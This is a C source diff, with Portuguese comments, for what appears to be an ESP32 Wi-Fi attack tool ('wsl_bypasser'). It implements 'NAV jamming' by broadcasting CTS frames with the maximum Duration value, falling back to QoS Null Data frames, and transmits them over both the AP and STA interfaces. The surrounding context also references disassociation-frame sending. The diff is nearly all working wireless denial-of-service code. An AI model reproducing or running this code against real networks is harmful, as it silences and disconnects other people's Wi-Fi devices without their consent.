@@ -109,15 +109,28 @@ static const uint8_t disassoc_frame_template[] = {
 };
 
 /**
- * Frame QoS Null Data com Duration máximo para NAV jamming
- * CTS (0xC4) não pode ser enviado via esp_wifi_80211_tx (control frame).
- * QoS Null Data (0xC8) é management frame e passa pela API.
- * Funciona na maioria dos chipsets que honram o campo Duration/NAV.
+ * Frame CTS (Clear-To-Send) para NAV jamming.
+ * CTS é control frame (type=1, subtype=12): todos os chipsets WiFi DEVEM
+ * honrar o campo Duration/IDS e setar NAV ao receber um CTS válido.
+ * Estrutura: FC(2) + Duration(2) + RA(6) = 10 bytes.
+ * FCS (4 bytes) é adicionado automaticamente pelo hardware.
+ */
+static const uint8_t cts_frame_template[] = {
+    0xc4, 0x00,                         /* Frame Control: CTS (Control, subtype 12) */
+    0xff, 0x7f,                         /* Duration: 32767 us (Max NAV) */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* RA: preenchido em runtime */
+};
+
+/**
+ * Fallback: QoS Null Data com Duration máximo para NAV jamming.
+ * Usado quando CTS não pode ser transmitido via esp_wifi_80211_tx.
+ * Frame Control 0xC8,0x00: To DS=0, From DS=0 → Addr1=DA(broadcast),
+ * Addr2=SA, Addr3=BSSID — combinação válida para broadcast.
  */
 static const uint8_t qos_null_frame_template[] = {
-    0xc8, 0x01,                         /* Frame Control: QoS Null Data */
+    0xc8, 0x00,                         /* Frame Control: QoS Null Data */
     0xff, 0x7f,                         /* Duration: 32767 us (Max NAV) */
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr1: RA (preenchido em runtime) */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr1: DA (broadcast) */
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2: SA (preenchido em runtime) */
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3: BSSID (preenchido em runtime) */
     0xf0, 0xff,                         /* Seq Control */
@@ -242,24 +255,46 @@ void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
 esp_err_t wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
     if (!target_mac) return ESP_ERR_INVALID_ARG;
 
-    uint8_t frame[sizeof(qos_null_frame_template)];
-    memcpy(frame, qos_null_frame_template, sizeof(qos_null_frame_template));
+    /* ── Tentativa 1: CTS real (control frame) ────────────────────────── */
+    /* CTS é o frame correto para NAV jamming — todo chipset WiFi honora     */
+    /* o Duration field de frames de controle. Estrutura: 10 bytes.         */
+    uint8_t cts_frame[sizeof(cts_frame_template)];
+    memcpy(cts_frame, cts_frame_template, sizeof(cts_frame_template));
+    /* RA = broadcast para todos ouvirem e setarem NAV */
+    memset(&cts_frame[4], 0xff, 6);
 
-    // Addr1: RA = broadcast para todos ouvirem e setarem NAV
-    memset(&frame[4], 0xff, 6);
-    // Addr2: SA = MAC da interface (obrigatório para o driver transmitir)
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, cts_frame, sizeof(cts_frame), false);
+    if (ret == ESP_OK) {
+        return ESP_OK;
+    }
+    /* Fallback: tentar via STA */
+    ret = esp_wifi_80211_tx(WIFI_IF_STA, cts_frame, sizeof(cts_frame), false);
+    if (ret == ESP_OK) {
+        return ESP_OK;
+    }
+    ESP_LOGW(TAG, "CTS frame falhou (0x%x), tentando QoS Null Data fallback", ret);
+
+    /* ── Tentativa 2: QoS Null Data (fallback) ────────────────────────── */
+    /* Alguns drivers IDF bloqueiam control frames em 80211_tx.              */
+    /* QoS Null Data com To DS=0 e broadcast é válido e muitos chipsets     */
+    /* honram o Duration field nesse tipo de frame também.                   */
+    uint8_t qos_frame[sizeof(qos_null_frame_template)];
+    memcpy(qos_frame, qos_null_frame_template, sizeof(qos_null_frame_template));
+    /* Addr1 = DA = broadcast */
+    memset(&qos_frame[4], 0xff, 6);
+    /* Addr2 = SA = MAC da interface */
     uint8_t mac[6];
     esp_wifi_get_mac(WIFI_IF_STA, mac);
-    memcpy(&frame[10], mac, 6);
-    // Addr3: BSSID = MAC da interface
-    memcpy(&frame[16], mac, 6);
+    memcpy(&qos_frame[10], mac, 6);
+    /* Addr3 = BSSID = MAC da interface */
+    memcpy(&qos_frame[16], mac, 6);
 
-    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+    ret = esp_wifi_80211_tx(WIFI_IF_AP, qos_frame, sizeof(qos_frame), false);
     if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "NAV frame via AP falhou (0x%x), tentando STA", ret);
-        ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+        ESP_LOGW(TAG, "QoS Null via AP falhou (0x%x), tentando STA", ret);
+        ret = esp_wifi_80211_tx(WIFI_IF_STA, qos_frame, sizeof(qos_frame), false);
         if (ret != ESP_OK) {
-            ESP_LOGE(TAG, "NAV frame falhou em ambas: 0x%x", ret);
+            ESP_LOGE(TAG, "NAV frame falhou em todas as tentativas: 0x%x", ret);
         }
     }
     return ret;
